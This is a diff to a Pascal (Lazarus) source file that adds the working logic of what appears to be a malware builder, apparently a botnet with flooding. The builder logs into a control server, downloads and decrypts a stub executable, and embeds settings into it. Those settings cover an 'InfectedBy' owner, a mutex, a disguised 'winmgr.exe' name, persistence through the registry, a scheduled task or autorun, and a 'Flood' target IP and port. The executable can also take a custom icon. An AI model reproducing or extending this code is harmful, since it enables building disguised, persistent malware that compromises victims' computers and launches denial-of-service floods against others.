@@ -5,9 +5,9 @@ unit MainUnit;
 interface
 
 uses
-  Classes, SysUtils, FileUtil, Forms, Controls, Graphics,
+  Classes, Windows, FileUtil, Forms, Controls, Graphics,
   Dialogs, ComCtrls, ExtCtrls, StdCtrls, Menus, BCButton, BCTypes,
-  Windows, LCLType;
+  SysUtils, LCLType, IdHTTP, INIFiles, Logic;
 
 type
 
@@ -16,7 +16,18 @@ type
   TBuildForm = class(TForm)
     BaseLocLabel: TLabel;
     BaseLocButton: TBCButton;
+    BindPanel: TPanel;
+    AboutPanel: TPanel;
+    Hat: TIdHTTP;
+    SaveButton: TBCButton;
     BuildStatLabel: TLabel;
+    SaveDialog: TSaveDialog;
+    ServerLabel: TLabel;
+    UserLabel: TLabel;
+    PassLabel: TLabel;
+    ServerEdit: TEdit;
+    UserEdit: TEdit;
+    PassEdit: TEdit;
     RegLabel: TLabel;
     TaskLabel: TLabel;
     AutoLabel: TLabel;
@@ -55,7 +66,6 @@ type
     InfLabel: TLabel;
     BaseNameLabel: TLabel;
     SettingsPanel: TPanel;
-    Label2: TLabel;
     SettingsMenu: TBCButton;
     MinimizeButton: TBCButton;
     MoveButton: TBCButton;
@@ -65,6 +75,7 @@ type
     TopMenu: TPanel;
     DelaySelector: TUpDown;
     procedure BrowseButtonClick(Sender: TObject);
+    procedure BuildButtonClick(Sender: TObject);
     procedure DefaultIconClick(Sender: TObject);
     procedure FormCreate(Sender: TObject);
     procedure FormDestroy(Sender: TObject);
@@ -85,10 +96,18 @@ type
       Shift: TShiftState; X, Y: Integer);
     procedure MenuItemClick(Sender: TObject);
     procedure RandButtonClick(Sender: TObject);
+    procedure SaveButtonClick(Sender: TObject);
   private
 
   public
     procedure ChangeTab(AName: String);
+    procedure GenMutex;
+    procedure LoadSettings;
+    procedure SaveSettings;
+    procedure Login;
+    function BuildFile: Boolean;
+    function CheckBuild: Boolean;
+    procedure Log(StrToLog: String);
   end;
 
 var
@@ -97,6 +116,8 @@ var
   MouseIsDown: Boolean;
 
   IconLoc, BaseLoc: String;
+
+  Settings: TINIFile;
 
 const
   ActiveC  = $0044F4AA;
@@ -110,6 +131,205 @@ implementation
 {$R *.lfm}
 
 { TBuildForm }
+
+function CheckEmpty(Str, Msg: String; var _E: String): Boolean;
+Begin
+  Result:=True;
+  if Length(Str)=0 then Begin
+    Result:=False;
+    _E+=Msg+', ';
+  end;
+End;
+
+function TBuildForm.CheckBuild: Boolean;
+var
+  Empty: String = '';
+Begin
+  //Check for empty values
+  Result:=CheckEmpty(PrefixEdit.Text, 'Prefix', Empty);
+  Result:=CheckEmpty(BaseNameEdit.Text, 'Base Name', Empty) and Result;
+  Result:=CheckEmpty(BaseLoc, 'Base Location', Empty) and Result;
+  Result:=CheckEmpty(IntEdit.Text, 'Internal Name', Empty) and Result;
+  if Result then Begin
+    //Fix value formats
+    if Length(MutexEdit.Text)=0 then GenMutex;
+    if RightStr(PrefixEdit.Text, 1)<>'-' then PrefixEdit.Text:=PrefixEdit.Text+'-';
+  end else Begin
+    Delete(Empty, Length(Empty)-1, 2);
+    ShowMessage('The following fields cannot be empty: '+Empty+'.');
+  End;
+end;
+
+function TBuildForm.BuildFile: Boolean;
+var
+  MS: TMemoryStream;
+  SCast: TStringList;
+  _Set: TMemINIFile;
+  C: Byte;
+  Res: THandle;
+Begin
+  Result:=True;
+  BuildButton.Enabled:=False;
+  ScanButton.Enabled:=False;
+
+  Log('Downloading a fresh build...');
+  MS:=TMemoryStream.Create;
+  try
+    Hat.Get(Settings.ReadString('General', 'Server', 'http://localhost')+'/modules/Build.mod', MS);
+    MS.Position:=0;
+    ToggleCrypt(MS, 7019);
+    MS.SaveToFile('Build.exe');
+  except on E: Exception do Begin
+    Result:=False;
+    Log('Error while downloading:'+sLineBreak+E.Message);
+    ChDel('Build.exe');
+    MS.Free;
+    Exit;
+  end;
+  end;
+
+  Log('Compiling the options...');
+  MS.Clear;
+  _Set:=TMemINIFile.Create(MS);
+  try
+    With _Set do Begin
+      WriteInteger('General', 'FirstRun', 1);
+      WriteString('General', 'InfectedBy', InfectedLabel.Caption);
+      WriteString('General', 'Server', Settings.ReadString('General', 'Server', 'http://localhost'));
+      WriteInteger('General', 'Delay', DelaySelector.Position);
+      WriteString('General', 'Mutex', MutexEdit.Text);
+
+      WriteString('Install', 'Prefix', PrefixEdit.Text);
+      WriteString('Install', 'BaseName', BaseNameEdit.Text);
+      WriteString('Install', 'BaseLocation', BaseLoc);
+      WriteString('Install', 'InternalName', IntEdit.Text);
+      if RegRadio.Checked then C:=1
+      else if TaskRadio.Checked then C:=2
+      else if AutoRadio.Checked then C:=3;
+      WriteInteger('Install', 'Startup', C);
+
+      WriteString('Flood', 'DefaultIP', '1.1.1.1');
+      WriteInteger('Flood', 'DefaultPort', 80);
+      WriteString('Flood', 'Message', 'My dreaming ends... Your nightmare begins!');
+      WriteInteger('Flood', 'MaxPower', 1);
+
+      SCast:=TStringList.Create;
+      GetStrings(SCast);
+    end;
+  except on E: Exception do Begin
+    Result:=False;
+    Log('Error while compiling:'+sLineBreak+E.Message);
+    ChDel('Build.exe');
+  end;
+  end;
+  _Set.Free;
+  MS.Free;
+  if Not(Result) then Exit;
+
+  try
+    Res:=BeginUpdateResource('Build.exe', False);
+    UpdateResource(Res, RT_RCDATA, 'Settings', LANG_NEUTRAL, @SCast.Text[1], Length(SCast.Text));
+    EndUpdateResource(Res, False);
+    if FileExists(IconLoc) then Begin
+      ChangeIcon('Build.exe', IconLoc);
+    end;
+  except on E: Exception do Begin
+    Result:=False;
+    Log('Error while updating the resources:'+sLineBreak+E.Message);
+    ChDel('Build.exe');
+  end;
+  end;
+  SCast.Free;
+  if Not(Result) then Exit;
+
+  Log('Nothing to build...');
+  ScanButton.Enabled:=True;
+  BuildButton.Enabled:=True;
+end;
+
+procedure TBuildForm.Log(StrToLog: String);
+Begin
+  BuildStatLabel.Caption:=StrToLog;
+  Application.ProcessMessages;
+end;
+
+procedure TBuildForm.LoadSettings;
+Begin
+  Settings:=TINIFile.Create(ChangeFileExt(Application.ExeName, '.ini'));
+  ServerEdit.Text:=Settings.ReadString('General', 'Server', 'http://localhost');
+  UserEdit.Text:=Settings.ReadString('General', 'User', 'User');
+  PassEdit.Text:=Settings.ReadString('General', 'Pass', '');
+  if Length(PassEdit.Text)>0 then PassEdit.Text:=DecryptStr(PassEdit.Text, MasterKey);
+  Left:=Settings.ReadInteger('Window', 'PosX', 175);
+  Top:=Settings.ReadInteger('Window', 'PosY', 45);
+  PrefixEdit.Text:=Settings.ReadString('Build', 'Prefix', 'Doctor');
+  BaseNameEdit.Text:=Settings.ReadString('Build', 'BaseName', 'Plague');
+  BaseLoc:=Settings.ReadString('Build', 'BaseLocation', '');
+  if Length(BaseLoc)>0 then BaseLocButton.Caption:=BaseLoc else BaseLocButton.Caption:='Select one';
+  IconLoc:=Settings.ReadString('Build', 'Icon', '');
+  if Not(FileExists(IconLoc)) then IconLoc:='';
+  if Length(IconLoc)>0 then IconImage.Picture.LoadFromFile(IconLoc)
+  else IconImage.Picture.LoadFromFile('img\default.ico');
+  IntEdit.Text:=Settings.ReadString('Build', 'InternalName', 'winmgr.exe');
+  DelaySelector.Position:=Settings.ReadInteger('Build', 'Delay', 5000);
+  Case Settings.ReadInteger('Build', 'Startup', 3) of
+  1: RegRadio.Checked:=True;
+  2: TaskRadio.Checked:=True;
+  3: AutoRadio.Checked:=True;
+  end;
+end;
+
+procedure TBuildForm.SaveSettings;
+var
+  C: Byte;
+Begin
+  Settings.WriteString('General', 'Server', ServerEdit.Text);
+  Settings.WriteString('General', 'User', UserEdit.Text);
+  Settings.WriteString('General', 'Pass', EncryptStr(PassEdit.Text{%H-}, MasterKey));
+  Settings.WriteString('Build', 'Prefix', PrefixEdit.Text);
+  Settings.WriteString('Build', 'BaseName', BaseNameEdit.Text);
+  Settings.WriteString('Build', 'BaseLocation', BaseLoc);
+  Settings.WriteString('Build', 'InternalName', IntEdit.Text);
+  Settings.WriteInteger('Build', 'Delay', DelaySelector.Position);
+  Settings.WriteString('Build', 'Icon', IconLoc);
+  if RegRadio.Checked then C:=1
+  else if TaskRadio.Checked then C:=2
+  else if AutoRadio.Checked then C:=3;
+  Settings.WriteInteger('Build', 'Startup', C);
+end;
+
+procedure TBuildForm.Login;
+var
+  P: TStringList;
+  R, T: String;
+  Error: Boolean = False;
+Begin
+  if Settings.ReadString('General', 'Server', 'UNKNOWN')<>'UNKNOWN' then Begin
+    T:=Settings.ReadString('General', 'Pass', '');
+    if Length(T)>0 then T:=DecryptStr(T, MasterKey);
+    P:=TStringList.Create;
+    P.Add('user='+Settings.ReadString('General', 'User', 'User'));
+    P.Add('pass='+T);
+    P.Add('builder=true');
+    try
+      R:=Hat.Post(Settings.ReadString('General', 'Server', 'http://localhost')+'/login.php', P);
+    except on E: Exception do Begin
+      Error:=True;
+      ShowMessage('Login failed! Please check your server. ['+E.Message+']');
+    end;
+    end;
+    P.Free;
+    if Not(Error) then
+    if R='Success' then Begin
+      InfectedLabel.Caption:=Settings.ReadString('General', 'User', 'Unknown');
+      BuildButton.Enabled:=True;
+      ScanButton.Enabled:=True;
+    end else ShowMessage('Login failed! Plase check your username/password.');
+  end else Begin
+    ChangeTab('SettingsMenu');
+    ShowMessage('Please adjust your settings!');
+  end;
+end;
 
 procedure TBuildForm.ChangeTab(AName: String);
 Begin
@@ -126,6 +346,20 @@ Begin
   end else Begin
     SettingsMenu.StateNormal.Background.Style:=bbsColor;
     SettingsPanel.Visible:=False;
+  end;
+  if AName='BindMenu' then Begin
+    BindMenu.StateNormal.Background.Style:=bbsGradient;
+    BindPanel.Visible:=True;
+  end else Begin
+    BindMenu.StateNormal.Background.Style:=bbsColor;
+    BindPanel.Visible:=False;
+  end;
+  if AName='AboutMenu' then Begin
+    AboutMenu.StateNormal.Background.Style:=bbsGradient;
+    AboutPanel.Visible:=True;
+  end else Begin
+    AboutMenu.StateNormal.Background.Style:=bbsColor;
+    AboutPanel.Visible:=False;
   end;
 end;
 
@@ -152,11 +386,14 @@ end;
 procedure TBuildForm.FormCreate(Sender: TObject);
 begin
   ChangeTab('BuildMenu');
+  PassEdit.PasswordChar:=chr(149);
+  LoadSettings;
+  Login;
 end;
 
 procedure TBuildForm.FormDestroy(Sender: TObject);
 begin
-
+  Settings.Free;
 end;
 
 procedure TBuildForm.LocMenuDrawItem(Sender: TObject; ACanvas: TCanvas;
@@ -199,6 +436,17 @@ begin
   end;
 end;
 
+procedure TBuildForm.BuildButtonClick(Sender: TObject);
+begin
+  if CheckBuild then
+    if SaveDialog.Execute then
+      if BuildFile then Begin
+        CopyFile('Build.exe', SaveDialog.FileName, True, False);
+        ChDel('Build.exe');
+        ShowMessage('Build succeeded!');
+      end;
+end;
+
 procedure TBuildForm.DefaultIconClick(Sender: TObject);
 begin
   IconLoc:='';
@@ -232,6 +480,8 @@ procedure TBuildForm.MoveButtonMouseUp(Sender: TObject; Button: TMouseButton;
   Shift: TShiftState; X, Y: Integer);
 begin
   MouseIsDown:=False;
+  Settings.WriteInteger('Window', 'PosX', Left);
+  Settings.WriteInteger('Window', 'PosY', Top);
 end;
 
 procedure TBuildForm.MenuItemClick(Sender: TObject);
@@ -244,7 +494,7 @@ begin
   BaseLocButton.Caption:=BaseLoc;
 end;
 
-procedure TBuildForm.RandButtonClick(Sender: TObject);
+procedure TBuildForm.GenMutex;
 var
   ID: TGUID;
   S:  String;
@@ -255,6 +505,17 @@ begin
     Delete(S, Length(S), 1);
     MutexEdit.Text:=S;
   end;
+end;
+
+procedure TBuildForm.RandButtonClick(Sender: TObject);
+Begin
+  GenMutex;
+end;
+
+procedure TBuildForm.SaveButtonClick(Sender: TObject);
+begin
+  SaveSettings;
+  ShowMessage('Settings saved! Please restart the builder for the changes to take effect!');
 end;
 
 end.
